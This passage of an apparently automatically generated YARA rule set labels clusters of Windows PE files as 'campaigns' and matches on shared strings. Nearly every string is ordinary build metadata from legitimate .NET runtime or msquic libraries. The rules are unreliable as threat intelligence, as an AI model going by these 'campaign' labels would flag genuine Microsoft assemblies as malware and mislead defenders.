        hash = "2cedef51b0a2c2b84240583339ecf2422c650e3388aa46f3494160b93b673887"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-438408ae.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "<JavaScriptStringEncode>g__EncodeCore|12_0" ascii
        $s1 = "/_/src/runtime/artifacts/obj/System.Web.HttpUtility/Release/net10.0/System.Web.HttpUtility.pdb" ascii
        $s2 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s3 = "7099398B830009F1C2137ABF489882243CAF03619F29CF2E4EFB264A4101E1F8" ascii
        $s4 = ".NETCoreApp,Version=v10.0" ascii
        $s5 = "s_invalidJavaScriptChars" ascii
        $s6 = "IsAotCompatible" ascii
        $s7 = "s_urlSafeBytes" ascii
        $s8 = "NeedsEncoding" ascii
        $s9 = ".NET 10.0" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 10 of them
}

rule Sightlines_tlsh_c3bce5bd_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-c3bce5bd"
        date = "2026-10-31"
        campaign = "tlsh-c3bce5bd"
        family = ""
        hash = "61807fddfe725fad18e1197fb8fe6580d8cba5ba92317cd07bf5e0ac99a98f62"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-c3bce5bd.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s1 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s2 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s3 = "/_/src/runtime/artifacts/obj/System.Threading.Tasks.Dataflow/Release/net10.0/System.Threading.Tasks." ascii
        $s4 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s5 = "at does not utilize this member.u" ascii
        $s6 = ".NETCoreApp,Version=v10.0" ascii
        $s7 = "ys\" featurevalue=\"false\">" ascii
        $s8 = "eTEe\\FU\\De\\F5\\G5US5U" ascii
        $s9 = "IsAotCompatible" ascii
        $s10 = "0V<6D*GVZJh\"o" ascii
        $s11 = ";bBFJvVzh*r*{" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_585d86c1_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-585d86c1"
        date = "2026-10-31"
        campaign = "tlsh-585d86c1"
        family = ""
        hash = "644956324add90895e75e0f6874beeac35713c62beb0bb5c0abb31d4cde7dc76"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-585d86c1.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s1 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s2 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s3 = "/_/src/runtime/artifacts/obj/System.Diagnostics.TraceSource/Release/net10.0/System.Diagnostics.Trace" ascii
        $s4 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s5 = "QAttempted to set {0} to a value that is too low.  Setting level to TraceLevel.Offr" ascii
        $s6 = "<CorrelationManager>k__BackingField" ascii
        $s7 = "OverloadResolutionPriorityAttribute" ascii
        $s8 = "<InitializedLock>k__BackingField" ascii
        $s9 = ".NETCoreApp,Version=v10.0" ascii
        $s10 = "<Callstack>k__BackingField" ascii
        $s11 = "<AppName>k__BackingField" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_cfea823c_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-cfea823c"
        date = "2026-10-31"
        campaign = "tlsh-cfea823c"
        family = ""
        hash = "60ea469ebda7911fcc9518e429fa468da7c8ba891808ca65f203f7611d754437"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-cfea823c.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "#\"'&(&)&*&+&,&.-/-0-8797:7=<@?A?B?GFHFONPNQNRNSNTNUTVNXWZYdcecgfhfnm" wide
        $s1 = "JSystem.Net.HttpWebRequest+<>c__DisplayClass224_0+<<CreateHttpClient>b__1>d" ascii
        $s2 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s3 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s4 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s5 = "System.Diagnostics.Tracing.EventKeywords, System.Diagnostics.Tracing, Version=10.0.0.0, Culture=neut" ascii
        $s6 = "5System.Net.FtpWebRequest+<CreateConnectionAsync>d__85" ascii
        $s7 = "?System.Net.HttpWebResponse+TruncatedReadStream+<ReadAsync>d__18" ascii
        $s8 = ",System.Net.RequestStream+<DisposeAsync>d__27" ascii
        $s9 = "DOnly HTTP/1.0 and HTTP/1.1 version requests are currently supported.Q" ascii
        $s10 = "<System.Net.RequestStreamContent+<SerializeToStreamAsync>d__4" ascii
        $s11 = ":System.Net.HttpWebRequest+<InternalGetRequestStream>d__195" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_062ff058_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-062ff058"
        date = "2026-10-31"
        campaign = "tlsh-062ff058"
        family = ""
        hash = "6758af6c57fe08ab2ef3426ab4fb7510c5a7c13948aaedf81339a33d8ee54250"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-062ff058.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/_/src/runtime/artifacts/obj/System.Core/Release/net10.0-windows/System.Core.pdb" ascii
        $s1 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s2 = ".NETCoreApp,Version=v10.0" ascii
        $s3 = "AlternateLookup`1" ascii
        $s4 = "IsAotCompatible" ascii
        $s5 = ".NET 10.0" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 6 of them
}

rule Sightlines_tlsh_d3bce0aa_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-d3bce0aa"
        date = "2026-10-31"
        campaign = "tlsh-d3bce0aa"
        family = ""
        hash = "743910e92ed832d96d003461df578633245755cd92dc4859feccf10b03794be7"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-d3bce0aa.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "3 8!9\":#;$<%=&>'?(@)G*H+I,J-K.L/M0N1O2P3Q4R5S6T7U8V9W:^;_<i=j>k?l@mAnBoCpDqErFsGtHuIvJwKxLyMzN{O|P}Q" wide
        $s1 = "9System.Linq.AsyncEnumerable+<<RightJoin>g__Impl|125_0>d`4" ascii
        $s2 = "9System.Linq.AsyncEnumerable+<<RightJoin>g__Impl|126_0>d`4" ascii
        $s3 = "=System.Linq.AsyncEnumerable+<<ToLookupAsync>g__Impl|189_0>d`2" ascii
        $s4 = "=System.Linq.AsyncEnumerable+<<ToLookupAsync>g__Impl|192_0>d`3" ascii
        $s5 = "6System.Linq.AsyncEnumerable+<<GroupBy>g__Impl|71_0>d`4" ascii
        $s6 = "8System.Linq.AsyncEnumerable+<<GroupJoin>g__Impl|73_0>d`4" ascii
        $s7 = "9System.Linq.AsyncEnumerable+<<TakeWhile>g__Impl|175_0>d`1" ascii
        $s8 = "9System.Linq.AsyncEnumerable+<<TakeWhile>g__Impl|176_0>d`1" ascii
        $s9 = "9System.Linq.AsyncEnumerable+<<TakeWhile>g__Impl|178_0>d`1" ascii
        $s10 = "7System.Linq.AsyncEnumerable+<<UnionBy>g__Impl|196_0>d`2" ascii
        $s11 = "BSystem.Linq.AsyncEnumerable+<<FirstOrDefaultAsync>g__Impl|59_0>d`1" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 2585104 and 12 of them
}

rule Sightlines_tlsh_c0865bf8_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-c0865bf8"
        date = "2026-10-31"
        campaign = "tlsh-c0865bf8"
        family = ""
        hash = "7875941c62c402cbb1f3505883bf87ed74088f18171ff3a66d8c8fa06e511836"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-c0865bf8.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "OSystem.IO.Pipelines.PipeWriterStream+<<GetFlushResultAsTask>g__AwaitTask|29_0>d" ascii
        $s1 = ">System.IO.Pipelines.PipeReader+<<CopyToAsync>g__Awaited|15_1>d" ascii
        $s2 = "7System.IO.Pipelines.PipeReader+<CopyToAsyncCore>d__16`1" ascii
        $s3 = "7System.IO.Pipelines.StreamPipeReader+<CopyToAsync>d__41" ascii
        $s4 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s5 = "3System.IO.Pipelines.PipeWriter+<CopyFromAsync>d__14" ascii
        $s6 = "<IsDefaultSharedMemoryPool>k__BackingField" ascii
        $s7 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s8 = ">System.IO.Pipelines.StreamPipeWriter+<FlushAsyncInternal>d__39" ascii
        $s9 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s10 = "9System.IO.Pipelines.PipeReader+<ReadAtLeastAsyncCore>d__4" ascii
        $s11 = "9System.IO.Pipelines.StreamPipeWriter+<CompleteAsync>d__33" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_a6b5fae6_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-a6b5fae6"
        date = "2026-10-31"
        campaign = "tlsh-a6b5fae6"
        family = ""
        hash = "6246f5fe726fbf612ca621961fd90a440425d64e9f4e51b7bb7adb80651032fa"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-a6b5fae6.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "[conn][%1] Received APPLICATION_ERROR error, delaying close in expectation of a 1-RTT CONNECTION_CLO" wide
        $s1 = "C:\\__w\\1\\s\\msquic\\src\\platform\\datapath_winuser.c" ascii
        $s2 = "[sett] StreamMultiReceiveEnabled  = %hhu" ascii
        $s3 = "C:\\__w\\1\\s\\msquic\\artifacts\\bin\\winuser\\cmakeouttemp\\msquic.pdb" ascii
        $s4 = "C:\\__w\\1\\s\\msquic\\src\\platform\\datapath_raw_xdp_win.c" ascii
        $s5 = "C:\\__w\\1\\s\\msquic\\src\\platform\\datapath_raw_socket.c" ascii
        $s6 = "C:\\__w\\1\\s\\msquic\\src\\platform\\platform_winuser.c" ascii
        $s7 = "C:\\__w\\1\\s\\msquic\\src\\platform\\datapath_raw_win.c" ascii
        $s8 = "C:\\__w\\1\\s\\msquic\\src\\platform\\platform_worker.c" ascii
        $s9 = "C:\\__w\\1\\s\\msquic\\src\\platform\\tls_schannel.c" ascii
        $s10 = "C:\\__w\\1\\s\\msquic\\src\\core\\packet_builder.c" ascii
        $s11 = "C:\\__w\\1\\s\\msquic\\src\\platform\\datapath_raw.c" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1074800 and 12 of them
}

rule Sightlines_tlsh_6ab6df4d_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-6ab6df4d"
        date = "2026-10-31"
        campaign = "tlsh-6ab6df4d"
        family = ""
        hash = "277a84ba155fe7808a514f32694a8157ec9f0eeeef00ef9643e5250004054ff0"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-6ab6df4d.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/_/src/runtime/artifacts/obj/System.Xml/Release/net10.0-windows/System.Xml.pdb" ascii
        $s1 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s2 = ".NETCoreApp,Version=v10.0" ascii
        $s3 = "IsAotCompatible" ascii
        $s4 = ".NET 10.0" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 5 of them
}

rule Sightlines_tlsh_a994399f_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-a994399f"
        date = "2026-10-31"
        campaign = "tlsh-a994399f"
        family = ""
        hash = "3b85daf02a3d9ed99b84bb1c639fe8b1ced46d8d157fa56f525f6b8c5be43b3e"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-a994399f.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s1 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s2 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s3 = "/_/src/runtime/artifacts/obj/System.Console/Release/net10.0-windows/System.Console.pdb" ascii
        $s4 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s5 = "#Access to the path '{0}' is denied.B" ascii
        $s6 = "HandleSetConsoleEncodingError" ascii
        $s7 = ".NETCoreApp,Version=v10.0" ascii
        $s8 = "InlineArrayAsReadOnlySpan" ascii
        $s9 = "ParamCollectionAttribute" ascii
        $s10 = "<>y__InlineArray2`1" ascii
        $s11 = "<>y__InlineArray3`1" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_d9279912_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-d9279912"
        date = "2026-10-31"
        campaign = "tlsh-d9279912"
        family = ""
        hash = "3dfe11fb30c5f84c911d9562be6c2037113cd8976ef2def3550ac415ae58955b"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-d9279912.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = ")(*(32768796:6<;=;@?A?B?CBD?IHLKONTSUSWVYXhglkmlnlolplqkrqsqtkukvkwkxkykzk{k|k}k" wide
        $s1 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s2 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s3 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s4 = "System.Diagnostics.Tracing.EventKeywords, System.Diagnostics.Tracing, Version=10.0.0.0, Culture=neut" ascii
        $s5 = "DOnly HTTP/1.0 and HTTP/1.1 version requests are currently supported.]" ascii
        $s6 = "/_/src/runtime/artifacts/obj/System.Net.HttpListener/Release/net10.0-windows/System.Net.HttpListener" ascii
        $s7 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s8 = "<InputStream>k__BackingField" ascii
        $s9 = ".NETCoreApp,Version=v10.0" ascii
        $s10 = "InlineArrayAsReadOnlySpan" ascii
        $s11 = "X509CertificateLoader" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1069680 and 12 of them
}

rule Sightlines_tlsh_fc22535c_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-fc22535c"
        date = "2026-10-31"
        campaign = "tlsh-fc22535c"
        family = ""
        hash = "2ccdc3fe937585aeb3473000be6fb45dab254f6198676c626846d59f2362ec68"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-fc22535c.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = ">System.Security.Claims.ClaimsIdentity+<<FindAll>g__Core|63_0>d" ascii
        $s1 = ">System.Security.Claims.ClaimsIdentity+<<FindAll>g__Core|64_0>d" ascii
        $s2 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s3 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s4 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s5 = "CSystem.Security.Claims.ClaimsIdentity+<CombinedClaimsIterator>d__42" ascii
        $s6 = "/_/src/runtime/artifacts/obj/System.Security.Claims/Release/net10.0/System.Security.Claims.pdb" ascii
        $s7 = "mThe StringComparison must be one of Ordinal, OrdinalIgnoreCase, InvariantCulture, InvariantCultureI" ascii
        $s8 = "InvalidOperationException_ActorGraphCircularo" wide
        $s9 = "ArgumentException_StringComparisonCultureAware" wide
        $s10 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s11 = "YThis instance contains state that cannot be serialized and deserialized on this platform.Z" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_f20f81c8_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-f20f81c8"
        date = "2026-10-31"
        campaign = "tlsh-f20f81c8"
        family = ""
        hash = "0a7f3dd2fb6147a3fc046aeac8501d764effe5a3d8cfa56d2b244aa50b874b98"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-f20f81c8.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s1 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s2 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s3 = "/_/src/runtime/artifacts/obj/System.IO.FileSystem.DriveInfo/Release/net10.0-windows/System.IO.FileSy" ascii
        $s4 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s5 = "#Access to the path '{0}' is denied.r" ascii
        $s6 = ".NETCoreApp,Version=v10.0" ascii
        $s7 = "InlineArrayAsReadOnlySpan" ascii
        $s8 = "s\" featurevalue=\"false\">" ascii
        $s9 = "<>y__InlineArray2`1" ascii
        $s10 = "<>y__InlineArray3`1" ascii
        $s11 = "stem.DriveInfo.pdb" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_92bc9299_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-92bc9299"
        date = "2026-10-31"
        campaign = "tlsh-92bc9299"
        family = ""
        hash = "6a7f1310e9ad73aba895e7bebac3fb9b947acbeef10c4372f56b146be9525e39"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-92bc9299.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s1 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s2 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s3 = "System.Diagnostics.Tracing.EventOpcode, System.Diagnostics.Tracing, Version=10.0.0.0, Culture=neutra" ascii
        $s4 = "/_/src/runtime/artifacts/obj/System.Linq.Parallel/Release/net10.0/System.Linq.Parallel.pdb" ascii
        $s5 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s6 = "2Partitioner returned a wrong number of partitions.T" ascii
        $s7 = ".NETCoreApp,Version=v10.0" ascii
        $s8 = "IsAotCompatible" ascii
        $s9 = "2.72CBNbazr\"z:" ascii
        $s10 = "C*-EJ%,O=GOIGa" ascii
        $s11 = "Xn3*=NH.M6U*Xn" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1552912 and 12 of them
}

rule Sightlines_tlsh_c05b34de_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-c05b34de"
        date = "2026-10-31"
        campaign = "tlsh-c05b34de"
        family = ""
        hash = "2179bb19f335b4fcacd0994ad2ccfdac6840deff09c7889debfe9dbb5b88a3e6"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-c05b34de.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s1 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s2 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s3 = "/_/src/runtime/artifacts/obj/System.ObjectModel/Release/net10.0/System.ObjectModel.pdb" ascii
        $s4 = "ISystem.Collections.ObjectModel.KeyedCollection`2+KeyedCollectionDebugView" ascii
        $s5 = "+Constructor supports only the '{0}' action.N" ascii
        $s6 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s7 = "KeyedCollectionDebugViewItem" ascii
        $s8 = ".NETCoreApp,Version=v10.0" ascii
        $s9 = "InlineArrayAsReadOnlySpan" ascii
        $s10 = "<>y__InlineArray2`1" ascii
        $s11 = "get_HasSingleTarget" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_6946ef28_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-6946ef28"
        date = "2026-10-31"
        campaign = "tlsh-6946ef28"
        family = ""
        hash = "00ac175b2b07fe9a7fa1d4247182f0dcbffdb94927a8329bffd45339f1bf0bb6"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-6946ef28.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s1 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s2 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s3 = "/_/src/runtime/artifacts/obj/System.Net.NetworkInformation/Release/net10.0-windows/System.Net.Networ" ascii
        $s4 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s5 = "<{0} can only be called once for each asynchronous operation.o" ascii
        $s6 = ".NETCoreApp,Version=v10.0" ascii
        $s7 = "InlineArrayAsReadOnlySpan" ascii
        $s8 = "\" featurevalue=\"false\">" ascii
        $s9 = "<>y__InlineArray2`1" ascii
        $s10 = "kInformation.pdb" ascii
        $s11 = "IsAotCompatible" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_1b772e07_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-1b772e07"
        date = "2026-10-31"
        campaign = "tlsh-1b772e07"
        family = ""
        hash = "369c8de4c2de87614987d65834a5ae86d56c5ec3e3659f4626e8925575f932c0"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-1b772e07.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s1 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s2 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s3 = "/_/src/runtime/artifacts/obj/System.IO.Pipes/Release/net10.0-windows/System.IO.Pipes.pdb" ascii
        $s4 = "<TryConnect>g__CreateNamedPipeClient|30_0" ascii
        $s5 = ">Specifying PipeAccessRights is not supported on this platform." ascii
        $s6 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s7 = "KCould not connect to the pipe because it was not owned by the current user.E" ascii
        $s8 = "PlatformNotSupported_PipeAccessRights" wide
        $s9 = ".NETCoreApp,Version=v10.0" ascii
        $s10 = "AccessRightsFromDirection" ascii
        $s11 = "InlineArrayAsReadOnlySpan" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_ffffb15b_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-ffffb15b"
        date = "2026-10-31"
        campaign = "tlsh-ffffb15b"
        family = ""
        hash = "1f4d13e03ecdaf1c1d4f0c8b14c13dde2e9bc06b9945a06d6d2207bfa3ef2958"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-ffffb15b.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s1 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s2 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s3 = "/_/src/runtime/artifacts/obj/System.Collections.NonGeneric/Release/net10.0/System.Collections.NonGen" ascii
        $s4 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s5 = "<DefaultInvariant>k__BackingField" ascii
        $s6 = "ToDebugViewDictionaryItemArray" ascii
        $s7 = ".NETCoreApp,Version=v10.0" ascii
        $s8 = "DebugViewDictionaryItem`2" ascii
        $s9 = "InlineArrayAsReadOnlySpan" ascii
        $s10 = "\" featurevalue=\"false\">" ascii
        $s11 = "<>y__InlineArray3`1" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_bb9e17cf_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-bb9e17cf"
        date = "2026-10-31"
        campaign = "tlsh-bb9e17cf"
        family = ""
        hash = "5f8361ca138b76d410edaa5ccfa765b808dd99a1db72b6cbe0942ecb52601fab"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-bb9e17cf.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s1 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s2 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s3 = "/_/src/runtime/artifacts/obj/System.Text.Encodings.Web/Release/net9.0-windows/System.Text.Encodings." ascii
        $s4 = "DTextEncoder does not implement MaxOutputCharsPerInputChar correctly.c" ascii
        $s5 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s6 = "580978A21F179B0480F4AC4BBAA7E699110F4C9E1282B63758A7E9653CA0EDE42" ascii
        $s7 = "E37440A8AB7EB4535BCC7DFC9F09735C5ED2828279F0FBD940C91A3F74C6ED7E" ascii
        $s8 = "97392397B3101DFB6D6C3B25E1D26343B91808D7BBF6EB7CA5AD3D4D98AF105F" ascii
        $s9 = "7533ADF00A145D285CDFDCD7A63332C731915F01A2A9BB101362BB8D0CF847C42" ascii
        $s10 = "__StaticArrayInitTypeSize=62_Align=2" ascii
        $s11 = "40DFDA6D4ED43D4879E2A200D2471641FC15E1C25DAB5D4D491BD811F7727FCC2" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_74e1f3dd_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-74e1f3dd"
        date = "2026-10-31"
        campaign = "tlsh-74e1f3dd"
        family = ""
        hash = "a82af566588f39ffb9f59303f537462fe7ab3e4e0557ec7ec375a18651bd833f"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-74e1f3dd.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "PSystem.Net.WebSockets.ManagedWebSocket+<CloseWithReceiveErrorAndThrowAsync>d__67" ascii
        $s1 = "GSystem.Net.WebSockets.ManagedWebSocket+<EnsureBufferContainsAsync>d__72" ascii
        $s2 = "BSystem.Net.WebSockets.ManagedWebSocket+<CloseOutputAsyncCore>d__50" ascii
        $s3 = "?System.Net.WebSockets.ManagedWebSocket+<CloseAsyncPrivate>d__69" ascii
        $s4 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s5 = "ISystem.Net.WebSockets.ManagedWebSocket+<HandleReceivedPingPongAsync>d__65" ascii
        $s6 = "CSystem.Net.WebSockets.ManagedWebSocket+<ReceiveAsyncPrivate>d__61`1" ascii
        $s7 = "QSystem.Net.WebSockets.ManagedWebSocket+<WaitForServerToCloseConnectionAsync>d__64" ascii
        $s8 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s9 = "CSystem.Net.WebSockets.ManagedWebSocket+<WaitForWriteTaskAsync>d__56" ascii
